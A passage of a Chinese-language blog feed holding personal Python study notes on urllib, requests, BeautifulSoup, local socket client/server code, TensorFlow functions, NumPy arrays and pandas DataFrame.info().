class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"></span><br><span class="line">d = &#123;</span><br><span class="line">    <span class="string">'id'</span> :<span class="number">1</span>,</span><br><span class="line">    <span class="string">'name'</span> : <span class="string">'tom'</span>,</span><br><span class="line">    <span class="string">'url'</span> : <span class="string">'http:www.magedu.com/python?id=1&amp;name=tom'</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">u = parse.urlencode(d) <span class="comment">#编码</span></span><br><span class="line"></span><br><span class="line">print(u)</span><br><span class="line">print(u.unquote(u))</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">name=tom&amp;url=http<span class="meta">%3Awww</span>.magedu.com<span class="meta">%2Fpython</span><span class="meta">%3Fid</span><span class="meta">%3D1</span><span class="meta">%26name</span><span class="meta">%3Dtom</span><span class="built_in">&amp;id</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">http:www.magedu.com/python<span class="built_in">?id</span>=<span class="number">1</span><span class="built_in">&amp;name</span>=tom</span><br></pre></td></tr></table></figure><h4 id="post"><a href="#post" class="headerlink" title="post"></a>post</h4><p><img src="C:%5CUsers%5C22334%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200304134716070.png" alt=""></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="keyword">from</span> urllib.request inport urlopen, Request</span><br><span class="line"><span class="keyword">import</span> simplejson </span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://httpbin.org/post'</span> <span class="comment">#POST</span></span><br><span class="line">data = parse.urlencode(&#123;<span class="string">'name'</span>:<span class="string">'张三,@=/&amp;*'</span>, <span class="string">'age'</span>:<span class="string">'6'</span>&#125;)</span><br><span class="line">ua =<span class="string">'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1'</span></span><br><span class="line"></span><br><span class="line">req = Request(url, headers=&#123;</span><br><span class="line"><span class="string">'User-agent'</span>: ua</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">print(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> urlopen(req, data=data.encode()) <span class="keyword">as</span> res <span class="comment">#POST请求 data不能是None</span></span><br><span class="line"><span class="comment">#with open('d:/bing.html'), 'wb+') as f:</span></span><br><span class="line"><span class="comment">#f.write(res.read())    write in file </span></span><br><span class="line"><span class="comment">#f.flush()</span></span><br><span class="line">text = res.read()</span><br><span class="line">d = simplejson.loads(text)</span><br><span class="line">print(d)</span><br><span class="line">print(type(d))</span><br></pre></td></tr></table></figure><h3 id="requests模块"><a href="#requests模块" class="headerlink" title="requests模块"></a>requests模块</h3><h4 id="request-get"><a href="#request-get" class="headerlink" title="request.get"></a>request.get</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#这个方法可以接收三个参数，其中第二个默认为None 第三个可选</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span><span class="params">(url, params=None, **kwargs)</span></span></span><br><span class="line"><span class="function">#作用是模拟发起<span class="title">GET</span>请求</span></span><br><span class="line"><span class="function"><span class="title">Sends</span> <span class="title">a</span> <span class="title">GET</span> <span class="title">request</span>.</span></span><br><span class="line"><span class="function">#模拟获取页面的<span class="title">url</span>链接</span></span><br><span class="line"><span class="function">:</span>param url: URL <span class="keyword">for</span> the new :<span class="class"><span class="keyword">class</span>:</span>Request object. </span><br><span class="line"><span class="comment">#额外参数 字典或字节流格式，可选</span></span><br><span class="line">:param params: (optional) Dictionary <span class="keyword">or</span> bytes to be sent <span class="keyword">in</span> the query string <span class="keyword">for</span> the :<span class="class"><span class="keyword">class</span>:</span>Request. </span><br><span class="line"><span class="comment"># 十二个控制访问参数，比如可以自定义header</span></span><br><span class="line">:param **kwargs: Optional arguments that request takes. </span><br><span class="line"><span class="comment"># 返回一个Response对象</span></span><br><span class="line">:<span class="keyword">return</span>: :<span class="class"><span class="keyword">class</span>:</span>Response &lt;Response&gt; object </span><br><span class="line">:type: requests.Response</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">kwargs: 控制访问的参数，均为可选项</span><br><span class="line"></span><br><span class="line">params : 字典或字节序列，作为参数增加到url中</span><br><span class="line"></span><br><span class="line">data : 字典、字节序列或文件对象，作为Request的内容 json : JSON格式的数据，作为Request的内容</span><br><span class="line"></span><br><span class="line">headers : 字典，HTTP定制头</span><br><span class="line"></span><br><span class="line">cookies : 字典或CookieJar，Request中的cookie</span><br><span class="line"></span><br><span class="line">auth : 元组，支持HTTP认证功能</span><br><span class="line"></span><br><span class="line">files : 字典类型，传输文件</span><br><span class="line"></span><br><span class="line">timeout : 设定超时时间，秒为单位</span><br><span class="line"></span><br><span class="line">proxies : 字典类型，设定访问代理服务器，可以增加登录认证</span><br><span class="line"></span><br><span class="line">allow_redirects : <span class="literal">True</span>/<span class="literal">False</span>，默认为<span class="literal">True</span>，重定向开关</span><br><span class="line"></span><br><span class="line">stream : <span class="literal">True</span>/<span class="literal">False</span>，默认为<span class="literal">True</span>，获取内容立即下载开关</span><br><span class="line"></span><br><span class="line">verify : <span class="literal">True</span>/<span class="literal">False</span>，默认为<span class="literal">True</span>，认证SSL证书开关</span><br><span class="line"></span><br><span class="line">cert : 本地SSL证书路径</span><br><span class="line"></span><br><span class="line">url: 拟更新页面的url链接</span><br><span class="line"></span><br><span class="line">data: 字典、字节序列或文件，Request的内容</span><br><span class="line"></span><br><span class="line">json: JSON格式的数据，Request的内容</span><br></pre></td></tr></table></figure><h3 id="bs4"><a href="#bs4" class="headerlink" title="bs4"></a>bs4</h3><p>beautifulsoup对象的使用方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#找到文档的title</span></span><br><span class="line">soup.title</span><br><span class="line"><span class="comment"># &lt;title&gt;The Dormouse's story&lt;/title&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#title的name值</span></span><br><span class="line">soup.title.name</span><br><span class="line"><span class="comment"># u'title'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#title中的字符串String</span></span><br><span class="line">soup.title.string</span><br><span class="line"><span class="comment"># u'The Dormouse's story'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#title的父亲节点的name属性</span></span><br><span class="line">soup.title.parent.name</span><br><span class="line"><span class="comment"># u'head'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#文档的第一个找到的段落</span></span><br><span class="line">soup.p</span><br><span class="line"><span class="comment"># &lt;p class="title"&gt;&lt;b&gt;The Dormouse's story&lt;/b&gt;&lt;/p&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到的p的class属性值</span></span><br><span class="line">soup.p[<span class="string">'class'</span>]</span><br><span class="line"><span class="comment"># u'title'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到a标签</span></span><br><span class="line">soup.a</span><br><span class="line"><span class="comment"># http://example.com/elsie" id="link1"&gt;Elsie</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到所有的a标签</span></span><br><span class="line">soup.find_all(<span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># [http://example.com/elsie" id="link1"&gt;Elsie,</span></span><br><span class="line"><span class="comment">#  http://example.com/lacie" id="link2"&gt;Lacie,</span></span><br><span class="line"><span class="comment">#  http://example.com/tillie" id="link3"&gt;Tillie]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#找到id值等于3的a标签</span></span><br><span class="line">soup.find(id=<span class="string">"link3"</span>)</span><br><span class="line"><span class="comment"># http://example.com/tillie" id="link3"&gt;Tillie</span></span><br></pre></td></tr></table></figure><h2 id="socket-编程"><a href="#socket-编程" class="headerlink" title="socket 编程"></a>socket 编程</h2><p><img src="/writing/images/python/20171029235256803.png" alt="这里写图片描述"></p><p><a href="https://blog.csdn.net/piglite/article/details/78389310" target="_blank" rel="noopener">参考</a></p><p><a href="https://www.cnblogs.com/skynet/archive/2010/12/12/1903949.html" target="_blank" rel="noopener">参考二</a></p><h3 id="python3-scoket内建函数"><a href="#python3-scoket内建函数" class="headerlink" title="python3 scoket内建函数"></a>python3 scoket内建函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">创建socket对象</span><br><span class="line">sk &#x3D; socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)</span><br><span class="line">参数一：地址簇</span><br><span class="line">    socket.AF_INET IPv4（默认）</span><br><span class="line">    socket.AF_INET6 IPv6</span><br><span class="line">    socket.AF_UNIX 只能够用于单一的Unix系统进程间通信</span><br><span class="line">参数二：类型</span><br><span class="line">    socket.SOCK_STREAM　　流式socket , for TCP （默认）</span><br><span class="line">    socket.SOCK_DGRAM　　 数据报式socket , for UDP</span><br><span class="line">    socket.SOCK_RAW 原始套接字，普通的套接字无法处理ICMP、IGMP等网络报文，而</span><br><span class="line">    SOCK_RAW可以；其次，SOCK_RAW也可以处理特殊的IPv4报文；此外，利用原始套接字，可以</span><br><span class="line">    通过IP_HDRINCL套接字选项由用户构造IP头。</span><br><span class="line">    socket.SOCK_RDM 是一种可靠的UDP形式，即保证交付数据报但不保证顺序。</span><br><span class="line">    SOCK_RAM用来提供对原始协议的低级访问，在需要执行某些特殊操作时使用，</span><br><span class="line">    如发送ICMP报文。SOCK_RAM通常仅限于高级用户或管理员运行的程序使用。</span><br><span class="line">　　socket.SOCK_SEQPACKET 可靠的连续数据包服务</span><br><span class="line">参数三：协议</span><br><span class="line">    0　　（默认）与特定的地址家族相关的协议,如果是 0 ，</span><br><span class="line">    则系统就会根据地址格式和套接类别,自动选择一个合适的协议</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">服务端程序</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment"># 开启ip和端口</span></span><br><span class="line">ip_port = (<span class="string">'127.0.0.1'</span>, <span class="number">9999</span>)</span><br><span class="line"><span class="comment"># 生成一个socket对象</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line"><span class="comment"># 绑定ip端口</span></span><br><span class="line">sk.bind(ip_port)</span><br><span class="line"><span class="comment"># 最多连接数</span></span><br><span class="line">sk.listen(<span class="number">5</span>)</span><br><span class="line"><span class="comment"># 开启死循环等待客户端连接</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    print(<span class="string">'服务器启动...'</span>)</span><br><span class="line">    <span class="comment"># 等待链接,阻塞，直到渠道链接 conn打开一个新的对象专门给当前链接的客户端 addr是ip地址</span></span><br><span class="line">    conn, addr = sk.accept()</span><br><span class="line">    print(<span class="string">"客户端地址:"</span>,str(addr))</span><br><span class="line">    <span class="comment"># 获取客户端请求数据</span></span><br><span class="line">    client_data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="comment"># 打印对方的数据</span></span><br><span class="line">    print(client_data.decode(<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment"># 向对方发送数据</span></span><br><span class="line">    <span class="comment">#也可写成conn.send("来自服务器的问候".encode("utf-8"))</span></span><br><span class="line">    conn.send(bytes(<span class="string">"来自服务器的问候"</span>,<span class="string">"utf-8"</span>))</span><br><span class="line">    <span class="comment"># 关闭链接</span></span><br><span class="line">    conn.close()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">客户端代码</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment">#链接服务端ip和端口</span></span><br><span class="line">ip_port = (<span class="string">'127.0.0.1'</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="comment">#生成一个socket对象</span></span><br><span class="line">sk = socket.socket()</span><br><span class="line"><span class="comment">#请求连接服务端</span></span><br><span class="line">sk.connect(ip_port)</span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line"><span class="comment">#也可写成sk.send("hello,服务器".encode("utf-8"))</span></span><br><span class="line">sk.send(bytes(<span class="string">"hello,服务器"</span>,<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="comment">#接受数据</span></span><br><span class="line">server_reply = sk.recv(<span class="number">1024</span>)</span><br><span class="line"><span class="comment">#打印接受的数据</span></span><br><span class="line"><span class="keyword">print</span> (server_reply.decode(<span class="string">"utf-8"</span>))</span><br><span class="line"><span class="comment">#关闭连接</span></span><br><span class="line">sk.close()</span><br></pre></td></tr></table></figure><h2 id="科学计算"><a href="#科学计算" class="headerlink" title="科学计算"></a>科学计算</h2><p>tensorflow</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">常用函数</span><br><span class="line">全<span class="number">0</span>矩阵：tf.zeros(<span class="literal">[<span class="number">2</span>,<span class="number">3</span>]</span>,<span class="built_in">int32</span>)</span><br><span class="line">全<span class="number">1</span>矩阵：tf.ones(<span class="literal">[<span class="number">2</span>,<span class="number">3</span>]</span>,<span class="built_in">int32</span>)</span><br><span class="line">全为指定数字矩阵：tf.fill(<span class="literal">[<span class="number">2</span>,<span class="number">3</span>]</span>,<span class="number">9</span>)</span><br><span class="line">给定常量：tf.constant</span><br><span class="line">矩阵对应位置相乘：*</span><br><span class="line">矩阵变量：tf.Variable</span><br><span class="line">矩阵乘法：tf.matmul</span><br><span class="line">正态分布：tf.random_normal</span><br><span class="line">均匀分布：tf.random_uniform</span><br><span class="line">Gamma分布：tf.random_gamma</span><br><span class="line">限制张量值得范围：tf.clip<span class="constructor">_by_value(<span class="params">y</span>, 1e-10, 1.0)</span></span><br><span class="line"></span><br><span class="line">损失函数</span><br><span class="line">分类--交叉熵：corss_entropy = tf.nn.softmax<span class="constructor">_cross_entropy_with_logits(<span class="params">labels</span>=<span class="params">y_</span>,<span class="params">logits</span>=<span class="params">y</span>)</span></span><br><span class="line">回归--均方误差：mse = tf.reduce<span class="constructor">_mean(<span class="params">tf</span>.<span class="params">square</span>(<span class="params">y_</span>-<span class="params">y</span>)</span>)</span><br><span class="line"></span><br><span class="line">正则化函数</span><br><span class="line">L1正则化：tf.contrib.layers.l1<span class="constructor">_regularizer(<span class="params">lambda</span>)</span>(w)</span><br><span class="line">L2正则化：tf.contrib.layers.l2<span class="constructor">_regularizer(<span class="params">lambda</span>)</span>(w)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>人点赞</span><br><span class="line">tensorflow</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">作者：JianjinL</span><br><span class="line">链接：https:<span class="comment">//www.jianshu.com/p/d295203a7148</span></span><br><span class="line">来源：简书</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure><h2 id="python——base"><a href="#python——base" class="headerlink" title="python——base"></a>python——base</h2><h3 id="继承"><a href="#继承" class="headerlink" title="继承"></a>继承</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">a</span>:</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span><span class="params">(a)</span>:</span>   <span class="comment">#b继承a</span></span><br></pre></td></tr></table></figure><h3 id="解决Scripts-文件夹下没有pip-exe文件"><a href="#解决Scripts-文件夹下没有pip-exe文件" class="headerlink" title="解决Scripts 文件夹下没有pip.exe文件"></a>解决Scripts 文件夹下没有pip.exe文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m ensurepip</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/package_function</title>
      <link href="python/package_function/"/>
      <url>python/package_function/</url>
      
        <content type="html"><![CDATA[<h1 id="package"><a href="#package" class="headerlink" title="package"></a>package</h1><a id="more"></a><p>记录一下 常用的包函数  </p><h2 id="math"><a href="#math" class="headerlink" title="math"></a>math</h2><figure class="highlight gml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">math.pow(<span class="symbol">x</span>,<span class="symbol">y</span>) 返回<span class="symbol">x</span>的<span class="symbol">y</span>次方的值</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>python/Numpy</title>
      <link href="python/Numpy/"/>
      <url>python/Numpy/</url>
      
        <content type="html"><![CDATA[<p>typora-root-url: ..</p><h1 id="科学计算"><a href="#科学计算" class="headerlink" title="科学计算"></a>科学计算</h1><a id="more"></a><h2 id="NumPy"><a href="#NumPy" class="headerlink" title="NumPy"></a>NumPy</h2><p>NumPy中的<strong>基本数据类型</strong></p><table><thead><tr><th>名称</th><th>描述</th></tr></thead><tbody><tr><td>bool</td><td>用一个字节存储的布尔类型（True或False）</td></tr><tr><td>inti</td><td>由所在平台决定其大小的整数（一般为int32或int64）</td></tr><tr><td>int8/16/32/64</td><td>整数，1/2/4/8个字节大小</td></tr><tr><td>uint8/16/32/64</td><td>无符号整数</td></tr><tr><td>float16/32/64</td><td>半/单/双精度浮点数，16/32/64位，指数、精度也不同</td></tr><tr><td>complex64/128</td><td>复数，分别用两个32/64位浮点数表示实部和虚部</td></tr></tbody></table><h3 id="info-函数"><a href="#info-函数" class="headerlink" title="info()函数"></a>info()函数</h3><p> info()函数用于打印DataFrame的简要摘要，显示有关DataFrame的信息，包括索引的数据类型dtype和列的数据类型dtype，非空值的数量和内存使用情况。</p><p>DataFrame.info <strong>(self, verbose=None, buf=None, max_cols=None, memory_usage=None, null_counts=None)</strong></p><table><thead><tr><th>Parameters</th><th>Value</th></tr></thead><tbody><tr><td><strong>self</strong></td><td>self只有在类的方法中才会有，其他函数或方法是不必带self的。有关self的更多内容，指路→ \to→<a href="https://www.cnblogs.com/huangbiquan/p/7741016.html" target="_blank" rel="noopener">https://www.cnblogs.com/huangbiquan/p/7741016.html</a></td></tr><tr><td><strong>verbose</strong>：bool, optional</td><td>“verbose”中文译为“冗长的”，该参数决定<strong>是否打印完整的摘要</strong>。如果为True，显示所有列的信息；如果为False，那么会省略一部分。<strong>默认情况下，</strong>遵循pandas.options.display.max_info_columns中的设置。</td></tr><tr><td><strong>buf</strong>：writable buffer, defaults to sys.stdout</td><td>该参数决定<strong>将输出发送到哪里</strong>。<strong>默认情况下，</strong> 输出打印到sys.stdout。如果需要进一步处理输出，请传递可写缓冲区。可将DataFrame.info()存储为变量，指路→ \to→<a href="https://blog.csdn.net/qq_34105362/article/details/90056765。" target="_blank" rel="noopener">https://blog.csdn.net/qq_34105362/article/details/90056765。</a></td></tr><tr><td><strong>max_col</strong>：sint, optional</td><td>该参数使得<strong>从“详细输出”转换为“缩减输出”</strong>，如果DataFrame的列数超过max_cols，则缩减输出。<strong>默认情况下，</strong> 使用pandas.options.display.max_info_columns中的设置。</td></tr><tr><td><strong>memory_usage</strong>：bool, str, optional</td><td>该参数决定<strong>是否应显示DataFrame元素（包括索引）的总内存使用情况</strong>。<strong>默认情况下为True。</strong> True始终显示内存使用情况；False永远不会显示内存使用情况。</td></tr><tr><td><strong>null_counts</strong>：bool, optional</td><td>该参数决定<strong>是否显示非空计数</strong>。值为True始终显示计数，而值为False则不显示计数。<strong>默认情况下，</strong> 仅当Dataframe小于pandas.options.display.max_info_rows和pandas.options.display.max_info_columns时才显示。</td></tr></tbody></table><p>在csv数据集建立数据集对象时可以用来查看数据集对象的信息】</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">test_data = pd.read_csv(<span class="string">r'D:\program\python\ai_program\example_data_csv\Titanic\test_data.csv'</span>)</span><br><span class="line">test_data.info()</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> '<span class="title">pandas</span>.<span class="title">core</span>.<span class="title">frame</span>.<span class="title">DataFrame</span>'&gt;</span></span><br><span class="line"><span class="class"><span class="title">RangeIndex</span>:</span> <span class="number">100</span> entries, <span class="number">0</span> to <span class="number">99</span></span><br><span class="line">Data columns (total <span class="number">17</span> columns):</span><br><span class="line"> <span class="comment">#   Column       Non-Null Count  Dtype  </span></span><br><span class="line">---  ------       --------------  -----  </span><br><span class="line"> <span class="number">0</span>   Unnamed: <span class="number">0</span>   <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">1</span>   PassengerId  <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">2</span>   Survived     <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">3</span>   Sex          <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">4</span>   Age          <span class="number">100</span> non-null    float64</span><br><span class="line"> <span class="number">5</span>   Fare         <span class="number">100</span> non-null    float64</span><br><span class="line"> <span class="number">6</span>   Pclass_1     <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">7</span>   Pclass_2     <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">8</span>   Pclass_3     <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">9</span>   Family_size  <span class="number">100</span> non-null    float64</span><br><span class="line"> <span class="number">10</span>  Title_1      <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">11</span>  Title_2      <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">12</span>  Title_3      <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">13</span>  Title_4      <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">14</span>  Emb_1        <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">15</span>  Emb_2        <span class="number">100</span> non-null    int64  </span><br><span class="line"> <span class="number">16</span>  Emb_3        <span class="number">100</span> non-null    int64  </span><br><span class="line">dtypes: float64(<span class="number">3</span>), int64(<span class="number">14</span>)</span><br></pre></td></tr></table></figure><h3 id="ndarray"><a href="#ndarray" class="headerlink" title="ndarray"></a>ndarray</h3><p>多维数组对象  （元素类型相同）</p><p>np.arry()生成一个ndarray数组， </p><p><img src="/images/Numpy/image-20200406193440690.png" alt="image-20200406193440690"></p><p>ndarry仅支持整数，浮点数和负数三种类型</p><p>shape 功能为查看矩阵或者数组的维数</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">x</span> = np.<span class="meta">array</span>(<span class="meta">list</span>/tuple)</span><br><span class="line"></span><br><span class="line"><span class="meta">x</span> = np.<span class="meta">array</span>(<span class="meta">list</span>/tuple,dtype=np.float32)</span><br></pre></td></tr></table></figure><p>生成均匀分布的array：<br>arange（最小值，最大值，步长）（左闭右开） : 创建等差数列<br>linspace（最小值，最大值，元素数量）<br>logspace(开始值, 终值, 元素个数): 创建等比数列、</p><p><code>np.ones</code>: 创建一个数组, 其中的元素全为 1<br><code>np.zeros</code>: 创建元素全为 0 的数组, 类似 np.ones<br><code>np.empty</code>创建一个内容随机并且依赖与内存状态的数组。<br><code>np.eye</code>: 创建一个对角线为 1 其他为 0 的矩阵.<br><code>np.identity</code>: 创建一个主对角线为 1 其他为 0 的方阵.</p><p><img src="/images/Numpy/image-20200408175853045.png" alt="image-20200408175853045"></p><p><img src="/images/Numpy/image-20200408175946155.png" alt="image-20200408175946155"></p><h4 id="获取数组的属性"><a href="#获取数组的属性" class="headerlink" title="获取数组的属性"></a>获取数组的属性</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = np.zeros((<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>))</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">array([[[<span class="number">0.</span>, <span class="number">0.</span>],</span><br><span class="line">        [<span 